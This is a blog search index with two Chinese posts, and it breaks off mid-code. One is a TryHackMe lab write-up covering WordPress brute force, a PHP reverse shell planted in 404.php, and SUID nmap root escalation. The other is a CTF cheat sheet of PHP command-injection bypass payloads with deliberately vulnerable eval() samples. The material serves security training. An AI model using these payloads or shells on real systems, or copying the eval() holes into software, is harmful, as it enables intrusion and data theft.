<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>THM靶机ROBOT渗透-WP</title>
      <link href="/2026/01/23/THM%E9%9D%B6%E6%9C%BAROBOT%E6%B8%97%E9%80%8F-WP/"/>
      <url>/2026/01/23/THM%E9%9D%B6%E6%9C%BAROBOT%E6%B8%97%E9%80%8F-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一个十分有趣的靶机，这道题用到了nc，nmap提权，wpscan几个非常常见的技巧。</p><p>我觉得难度还行，没有太难也没太简单。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>首先我们开启机子，然后ping一下看看。</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309057373-8ab64d25-bb8b-4581-b291-50e43ac61214.png?imageSlim"></p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309064071-565aa7cd-743e-47ca-83e5-5a011bde54d4.png?imageSlim"></p><p>都ok，然后我们使用nmap进行扫描（这里可以注意一点，一般nmap扫描的时候我们就可以去访问他的web网页去看看一些功能点了，没必要一直等nmap扫描完）</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309072690-0cbbf1c8-7653-4c49-ae47-72f66fcff270.png?imageSlim"></p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309080095-c9700727-9f4a-4386-9052-00b73590282c.png?imageSlim"></p><p>很帅的一个网页，我们对他的几个command进行一定的测试（已经测试过了），然后使用dirsearc工具开跑。</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309088203-f6932d37-46c2-45ef-9289-755be3c7b161.png?imageSlim"></p><p>发现了login与robots文件</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309095356-02769574-cb6c-42fd-9b28-eba975f5f8ac.png?imageSlim"></p><p>发现了一个字典还有flag1，一般来说靶机给你的dic都是用在他的login的，所以这里可以当作一个线索。</p><p>果然</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309103875-57c0e811-d300-4a49-8e52-2bf9a60a2ad5.png?imageSlim"></p><p>我们使用BP抓一下包（我这里的思路是这样的：因为我们现在不知道username和password，所以我们得枚举一下，如果说username对了，但是password错了，那么他的回响包应该长度是不一样的。以此我们进行渗透测试）我们使用刚刚我们下载的靶机的dic进行测试。</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309111747-893c1c65-eff1-4129-a352-d366b4a269eb.png?imageSlim"></p><p>我们发现Elliot用户的包的长度不一样，那username应该就是了。</p><p>然后我们再用wpscan进行密码爆破，密码也是用这个字典，跑不了的。</p><p>为什么这里不用BP爆破（总结一点，太慢了，这个字典80w个pw，怎么跑？）</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309119587-40f8981a-2eda-47da-a790-38b756051081.png?imageSlim"></p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309126659-3b5ecc53-9557-49e8-9a9c-947abd09faa9.png?imageSlim"></p><p>拿下</p><p>我们使用密码进去</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309134078-606c7556-9e39-4def-80b1-323bb9daa292.png?imageSlim"></p><p>WP框架最简单的拿shell的方法就是修改404.php页面了</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309141107-ee9ba774-890d-4516-b959-64a964f8548a.png?imageSlim"></p><p>我们使用一个webshell（在github上面下载了一个），然后修改Ip和port（注意修改为THM的VPN的ip，而不是原来的IP）</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309150807-b19853eb-7b2c-459d-a8db-9416db451b7f.png?imageSlim"></p><p>访问404页面</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309156916-84b0b713-1b45-48c3-8114-f88c28fec303.png?imageSlim"></p><p>然后使用nc监听</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309164151-c0886f91-f74f-4a35-bb05-2a37daac759a.png?imageSlim"></p><p>拿下</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309177406-b5a78fa9-0784-425a-af49-fd723bcee13f.png?imageSlim"></p><p>写完交互式shell，然后也发下了robot文件夹下面的两个文件。</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309187444-bf69cfb8-61d5-4f4e-ba4c-b0a387347fa2.png?imageSlim"></p><p>flag不能查看</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309197099-5595abfc-7021-421c-ac5c-a971598e9cd5.png?imageSlim"></p><p>但是可以查看password</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309204432-7774be9e-7250-46d0-960e-89e446966903.png?imageSlim"></p><p>这靶机提示拉满了啊，甚至什么编码都说了。</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309210039-2137f151-8299-46fd-a698-227aef06983a.png?imageSlim"></p><p>拿下robot的密码</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309216849-2697bcc3-160b-4b25-9545-e91c007090eb.png?imageSlim"></p><p>登录之后我们可以拿到flag2 了。</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309259768-91f37b15-cb55-4846-b338-689042287ea4.png?imageSlim"></p><p>最后一个flag肯定需要提权了，我们查看一下suid。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309274770-6f5db12c-b472-4851-8c15-fa4b59feccdf.png?imageSlim"></p><p>发现了&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap，记得存在nmap提权。查看了一下CTFObins，进行提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//Sudo</span><br><span class="line">//If the binary is allowed to run as superuser by sudo, it does not drop the elevated //privileges and may be used to access the file system, escalate or maintain privileged //access.</span><br><span class="line"></span><br><span class="line">//Input echo is disabled.</span><br><span class="line"></span><br><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br><span class="line">//The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell //commands.</span><br><span class="line"></span><br><span class="line">sudo nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309284660-9ed46a6e-ac78-4e9e-aabd-35ba68f6e8b8.png?imageSlim"></p><p>拿下</p><p>直接去root目录拿flag</p><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1708309290419-4a22d720-4911-4e9a-82e3-57c3994ed14b.png?imageSlim"></p><p>win</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中的RCE</title>
      <link href="/2026/01/23/CTF%E4%B8%AD%E7%9A%84RCE/"/>
      <url>/2026/01/23/CTF%E4%B8%AD%E7%9A%84RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>RCE</strong>(<em><font style="color:rgb(25, 27, 31);">Remote code execution</font></em><font style="color:rgb(25, 27, 31);">）远程代码执行漏洞，</font>RCE又分命令执行和代码执行。</p><ul><li><strong>RCE</strong>-远程代码执行：远程执行PHP代码</li><li><strong>RCE</strong>-远程命令执行：远程执行Linux或者Windows等系统命令。</li></ul><p>常见函数有：</p><ul><li><em>PHP</em>：<strong>eval()</strong>,<strong>assert()</strong>,<strong>preg_replace()</strong>,<strong>call_user_func()</strong>,<strong>call_user_func_array()<strong>以及</strong>array_map()，system, shell_exec, popen, passthru, proc_open</strong>等。</li><li><em>Python</em>：<strong>eval,exec,subprocess os.system commands.</strong></li><li><em>Java</em>：Java里面没有类似于php中的eval函数可以直接将字符串转化为代码执行的函数。但是又反射机制，并且有各种基于反射机制的表达式引擎。ps：<strong>OGNL, SpEL, MVEL</strong></li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="号绕过-ﾉ･ω･-ﾉ"><a href="#号绕过-ﾉ･ω･-ﾉ" class="headerlink" title="号绕过(ﾉ･ω･)ﾉ"></a><em>号绕过(ﾉ</em>･ω･)ﾉ</h2><p>这个理解起来其实很简单，这个指令放到Linux里面是这样的</p><!-- 这是一张图片，ocr 内容为： --><p><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/1709293245459-e3391719-aaa2-4444-99a1-534e4a35858e.png?imageSlim"></p><p>在Linux中，*是一个通配符，<font style="color:rgb(51, 51, 51);">代表当前目录下的所有隐藏目录和隐藏文件夹。</font></p><p><font style="color:rgb(51, 51, 51);">我们利用这一点可以绕过CTF中的一些函数。</font></p><p><font style="color:rgb(51, 51, 51);">ps：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$c</span>))   <span class="comment">//这里的i是大小写的意思</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看上面的if函数里面写的东西，他是禁止出现flag这个字符串，所以我们可以直接使用<em>来进行绕过。但是这里我们不仅可以使用**cat fla</em>.php<em><em>也可以使用tac命令来输出这个fla</em>.php，命令为</em><em>tac fla</em>php**.</p><h2 id="取代函数-ﾉ-･ω･-ﾉ"><a href="#取代函数-ﾉ-･ω･-ﾉ" class="headerlink" title="取代函数 (ﾉ*･ω･)ﾉ"></a>取代函数 (ﾉ*･ω･)ﾉ</h2><p>这个方法挺好用的，我们可以看一段具体的php判断代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>,<span class="variable">$c</span>))   </span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上文我们的system与php都被禁止了，这里我们可以看到上面的PHP执行命令函数。</p><p>我们可以使用里面的shell_exec函数，但是我们要注意，shell_exec函数需要我们把结果输出出来。那我们就可以这样构造payload的了</p><p>:::warning<br><font style="color:#000000;">url?c&#x3D;echo shell_exec(‘tac&#x2F;cat fla*);</font></p><p>:::</p><h2 id="参数逃逸-ﾉ-･ω･-ﾉ"><a href="#参数逃逸-ﾉ-･ω･-ﾉ" class="headerlink" title="参数逃逸(ﾉ*･ω･)ﾉ"></a>参数逃逸(ﾉ*･ω･)ﾉ</h2><p>我们看到这个姿势，也是通过一个php判断代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |/i&quot;</span>,<span class="variable">$c</span>))   <span class="comment">//这里还过滤的.和空格</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们对参数逃逸进行理解</p><p>因为是rce漏洞，所以我们可以使用代码在构造一些新的参数，比如说我们构造一个新的参数，那我们在url中可以先这样写。</p><p>:::warning<br>url?c&#x3D;eval($_GET[‘a’]);</p><p>:::</p><p>这样相当于构造了一个新的参数a，然后页面代码又没有对a参数进行限制，所以我们后面可以直接用a参数来进行对flag.php的读取。</p><p>:::warning<br>url?c&#x3D;eval($_GET[‘a’]);&amp;a&#x3D;cat flag.php;</p><p>:::</p><p>这就是我们所说的参数逃逸。</p><h2 id="管道符绕-ﾉ-･ω･-ﾉ"><a href="#管道符绕-ﾉ-･ω･-ﾉ" class="headerlink" title="管道符绕(ﾉ*･ω･)ﾉ"></a>管道符绕(ﾉ*･ω･)ﾉ</h2><p>管道符这里我们分为两个系统的：</p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ol><li>|：直接执行后面语句</li><li>||：前面执行失败，则执行后面</li><li>&amp;：两个都执行，如果前面的命令为假，则直接执行后面</li><li>&amp;&amp;如果前面的语句为假则直接出错，也不执行后面，前面为真，则都执行。</li></ol><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ol><li>|：显示后面语句的结果</li><li>||：当前面直接出错，执行后面的语句</li><li>&amp;：两个都执行，同win</li><li>&amp;&amp;：前面出错，则不执行后面，两个都为true才都执行，前面只能为true。</li><li>&#96;：在将括号内的命令处理完毕之后，会将返回的信息传给bash，再次执行。</li><li>;：执行完前面执行后面。</li></ol><h2 id="包含漏洞-伪协议-ﾉ-･ω･-ﾉ"><a href="#包含漏洞-伪协议-ﾉ-･ω･-ﾉ" class="headerlink" title="包含漏洞+伪协议 (ﾉ*･ω･)ﾉ"></a>包含漏洞+伪协议 (ﾉ*･ω･)ﾉ</h2><p>这个绕过需要用到我们之前讲到的参数逃逸的思想，我们通过一个例子来看。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;(/i&quot;</span>,<span class="variable">$c</span>))  <span class="comment">//这里我们国立了&#x27;,`和;号。  </span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到echo，;和我们之前用的反引号都被过滤掉了，那么既然分号与反引号都被注释掉了，我们就可以使用文件包含的思路。</p><p>:::warning<br>url?c&#x3D;include$_GET[a]?&gt;</p><p>:::</p><p>我们使用?&gt;来将这个php语句进行完成，然后我们后面跟上php的伪协议。这样我们的payload就变成了。</p><p>:::warning<br><strong>payload</strong>:url?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?tac fla*?></p><p>:::</p><p>这里我们使用data协议是因为，用户的输入会被当做php文件来执行，这样一来就达到了我们绕过的思路。</p><p>但是我们也可以使用其他的协议。</p><p>:::warning<br><strong>1.url?c&#x3D;include[a]?&gt;&amp;a&#x3D;php;&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p><p>:::</p><p>:::warning<br><strong>2.url?c&#x3D;include$_GETa]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;input post:<?php system('tac flag.php');?></strong></p><p>:::</p><h2 id="关键字绕过（总体）-ﾉ-･ω･-ﾉ"><a href="#关键字绕过（总体）-ﾉ-･ω･-ﾉ" class="headerlink" title="关键字绕过（总体）(ﾉ*･ω･)ﾉ"></a>关键字绕过（总体）(ﾉ*･ω･)ﾉ</h2><p>这里包含了很多中不同的绕过方式，但是都是属于关键字绕过这个大板块的。</p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在Linux中，空格可以替换为以下几种：</p><p>:::warning<br><strong>&lt;</strong>   <strong>&lt;&gt;</strong>   <strong>${IFS}</strong>   <strong>$IFS</strong>  <strong>%20(space)</strong>    <strong>%09(tab)</strong>   <strong>$IFS$9</strong>   <strong>$IFS$1</strong>等等</p><p>:::</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag.php</span><br><span class="line">cat&lt;&gt;flag.php</span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">IFSflag.php</span></span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;flag.php</span></span><br><span class="line"><span class="meta prompt_">cat%</span><span class="language-bash">20flag.php</span></span><br><span class="line"><span class="meta prompt_">cat%</span><span class="language-bash">09flag.php</span></span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">IFS<span class="variable">$1flag</span>.php</span></span><br></pre></td></tr></table></figure><p>这里主要是代码审计，看看那些是没有被过滤的，灵活运用。</p><h3 id="转义绕过"><a href="#转义绕过" class="headerlink" title="转义绕过"></a>转义绕过</h3><p>我们可以使用反斜杠进行转义</p><p>ps：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat flag  ---&gt;   ca\t fl\ag</span><br><span class="line">cat flag  ---&gt;   ca&quot;t flag</span><br><span class="line">cat flag  ---&gt;   ca&#x27;t flag</span><br></pre></td></tr></table></figure><p>这个就不多说了。</p><h3 id="特殊变量绕过"><a href="#特殊变量绕过" class="headerlink" title="特殊变量绕过"></a>特殊变量绕过</h3><p>我们可以使用Linux中的一些特殊变量进行绕过</p><p>ps：</p><p>$*   $@   $x    ${X}    &#x2F;&#x2F;这里的x代表任意值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">*t  flag.php</span></span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t flag.php</span></span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">xt flag.php</span></span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">&#123;X&#125;t flag.php</span></span><br></pre></td></tr></table></figure><p>这些都是shell的特殊变量，也是可以用来绕过的，这种类型可以用在过滤了cat这种命令或者其他关键字符串上面使用。</p><h3 id="RE绕过"><a href="#RE绕过" class="headerlink" title="RE绕过"></a>RE绕过</h3><p>这个也就是我们最开始的fla*.php。没什么好讲的。</p><p>其实这个应该也可以叫做正则表达式绕过。但是我想说，这里还有一个骚操作</p><p>比如说我们一下这个实列:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt;  ls</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">flag</span></span><br><span class="line">shell --&gt;  cat ?la*</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">flag&#123;ABsec&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h3><p>这个可以用在一些命令被过滤的情况下使用，比如说我们的ls命令被过滤了，那我们可以将ls这个命令编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;ls&#x27; | base64</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">bHMK</span></span><br><span class="line">`echo &#x27;bHMK&#x27; | base64 -d</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">flag.ph  test.php  ......</span></span><br></pre></td></tr></table></figure><h3 id="拼接法"><a href="#拼接法" class="headerlink" title="拼接法"></a>拼接法</h3><p>这个的大概思路为，用两个参数来保存flag这个字符串的每个部分。大致如下</p><p>:::warning<br>a&#x3D;fl;b&#x3D;ag;cat$IFS$a$b;</p><p>:::</p><p>类似于这种。</p><h2 id="过滤命令执行函数-ﾉ-･ω･-ﾉ"><a href="#过滤命令执行函数-ﾉ-･ω･-ﾉ" class="headerlink" title="过滤命令执行函数(ﾉ*･ω･)ﾉ"></a>过滤命令执行函数(ﾉ*･ω･)ﾉ</h2><h3 id="内敛绕过"><a href="#内敛绕过" class="headerlink" title="内敛绕过"></a><font style="color:rgb(34, 34, 34);">内敛绕过</font></h3><p>这个其实很简单，就是将反引号内的命令的输出作为输入执行。</p><p>:::warning<br>payload:url?c&#x3D;127.0.0.1;cat$IFS$!<code>ls</code></p><p>:::</p><p>会抓取ls返回的所有文件内容。</p><p>内敛绕过还有其他的写法，比如下面：</p><p>:::warning<br>echo $(ls);</p><p>?&gt;&lt;?&#x3D;&#96;ls1;</p><p>?&gt;&lt;?&#x3D;$(ls);</p><p>:::</p><h3 id="使用其他函数"><a href="#使用其他函数" class="headerlink" title="使用其他函数"></a>使用其他函数</h3><p>还记得我们前面讲的取代函数吗？和这个的思路一样，如果我们的执行命令函数被过滤的花花，我们就需要更换函数了</p><p>我们除了shell_exec()还可以用以下几种</p><p>:::warning<br>system()</p><p>passthru()</p><p>exec()</p><p>popen()</p><p>proc_open()</p><p>pcntl_exec()</p><p>highlight_file()</p><p>:::</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>这里我们这样玩，我们除了cat可以显示文本内容以外，在CTF中我们还可以使用一下几个姿势</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl file:///flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br><span class="line">tac flag</span><br><span class="line">//如果说我们遇到ls被过滤的话，我们也可以使用find</span><br><span class="line">find</span><br><span class="line">-?&gt;  .   ./flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="字符串长度限制-ﾉ-･ω･-ﾉ"><a href="#字符串长度限制-ﾉ-･ω･-ﾉ" class="headerlink" title="字符串长度限制(ﾉ*･ω･)ﾉ"></a>字符串长度限制(ﾉ*･ω･)ﾉ</h2><p>这个挺有意思的，在CTF中，题目可能会限制你输入的长度，如果说我们要绕过他的话，我们可以只用上文中的一些思想，我们直接看payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">flag&#123;ABsec&#125;</span></span><br><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span></span><br><span class="line">ls -t &gt; shell</span><br><span class="line">sh shell</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">flag&#123;ABsec&#125;</span></span><br></pre></td></tr></table></figure><p>首先是里面的一些命令</p><ol><li>空格\ ： 这个其实是换行。</li><li>ls -t ：按照时间将文本排序输出</li><li>ls -t &gt; shell：将ls -t的输出储存到shell文件中</li></ol><p>我们首先是用touch命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个\的原因在于，第一个\用于将后面的\变成字符串，第二个\是用来将后面的文本转换为字符串，以便用于后面的测试。</p><p>这样我们shell里面的样子应该是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat shell</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash"><span class="built_in">cat</span></span></span><br><span class="line">flag</span><br></pre></td></tr></table></figure><p>因为**    **就是用来换行的，不然他们连在一起也无法被解析。</p><h2 id="PATH-ﾉ-･ω･-ﾉ"><a href="#PATH-ﾉ-･ω･-ﾉ" class="headerlink" title="$PATH  (ﾉ*･ω･)ﾉ"></a>$PATH  (ﾉ*･ω･)ﾉ</h2><p>这个是利用环境变量来达到截取字母绕过的目的。</p><p>这里我们可以举一个例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">/opt/jdk-21/bin         //假如是这样的</span><br><span class="line">echo $&#123;PATH:2:1&#125;</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">p</span></span><br><span class="line">echo $&#123;PATH:3:1&#125;</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">t</span></span><br><span class="line">echo $&#123;PATH:3:2&#125;</span><br><span class="line"><span class="meta prompt_">-&gt;</span><span class="language-bash">t/</span></span><br></pre></td></tr></table></figure><p>Linux中${PATH:a:b}我们可以理解为从a位开始截取，截取b个长度（&#x2F;也算一位）</p><p>那我们对应这来的话就是这样的</p><p>:::warning<br>&#x2F; o p t &#x2F; j d k - 2 1 &#x2F;    b    i   n </p><p>0 1 2 3 4 5 6 7 8 9 10 11 12 13</p><p>:::</p><p>比如说我们echo ${PATH:3:2}</p><p>那就表示，我们从t开始，往后截取两位数</p><p>输出: t&#x2F;</p><p>但是这样可能也会出现一些没有的字母，但是我们需要那个字母的情况，这个时候我们可以自己取构造一个PATH。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/abcdefghijklmn/opq/rst/uvw/xyz/0123456789</span><br></pre></td></tr></table></figure><p>我们直接将全部的字母和数字都放到环境变量中，需要的时候我们就用上面的那个方法进行构造payload。</p><h2 id="取反操作"><a href="#取反操作" class="headerlink" title="取反操作"></a>取反操作</h2><p>我们这里拿一道ctf的题目来举例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ 